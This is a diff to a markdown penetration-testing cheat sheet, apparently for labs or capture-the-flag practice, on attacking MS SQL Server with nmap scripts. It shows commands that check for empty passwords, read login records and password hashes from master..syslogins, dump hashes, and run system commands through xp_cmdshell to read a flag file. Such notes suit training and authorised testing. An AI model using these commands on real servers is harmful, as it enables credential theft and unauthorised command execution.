@@ -38,7 +38,10 @@ nmap -p 1433 <ip> --script ms-sql-empty-password
 nmap -p 1433 <ip> --script ms-sql-query --script-args mssql.username=<user>,mssql.password=<pass>,ms-sql-query.query="SELECT * FROM master..syslogins" <host> -oN output.txt
 ```
 
+- Is used to retrieve information about user logins in the "master" database of a MS SQL Server instance.
+- Contains - login names, login types (ex: SQL or Windows login), password hashes etc.
 - Outputting it to a text file for better readability.
+
 
 ### Dumping hashes
 
@@ -46,3 +49,10 @@ nmap -p 1433 <ip> --script ms-sql-query --script-args mssql.username=<user>,mssq
 nmap -p 1433 <ip> --script ms-sql-dump-hashes --script-args mssql.username=<user>,mssql.password=<pass>
 ```
 
+### Using shell access in the system
+
+```
+nmap -p 1433 <ip> --script ms-sql-xp-cmdshell --script-args mssql.username=<user>,mssql.password=<pass>,ms-sql-xp-cmdshell.cmd="type C:\flag.txt"
+```
+
+- You can run CMD commands with this script.
